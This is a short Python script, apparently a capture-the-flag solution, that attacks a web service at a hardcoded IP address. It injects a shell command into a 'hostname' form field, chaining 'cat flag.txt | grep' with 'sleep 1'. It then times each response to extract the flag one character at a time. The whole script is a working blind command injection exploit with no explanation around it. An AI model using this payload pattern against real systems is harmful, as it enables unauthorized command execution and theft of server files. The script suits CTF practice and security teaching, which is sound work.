import requests
import time
import string

charset = string.ascii_letters + string.digits + "_{}?!"
url = "http://34.130.180.82:55922/"
flag = "LITCTF{"

while True:
    print(flag)
    for c in charset:
        payload = f'a ; cat flag.txt | grep "{flag + c}" && sleep 1'

        start = time.time()

        res = requests.post(url, data={"hostname": payload})

        end = time.time()

        if end - start > 1:
            flag += c
            break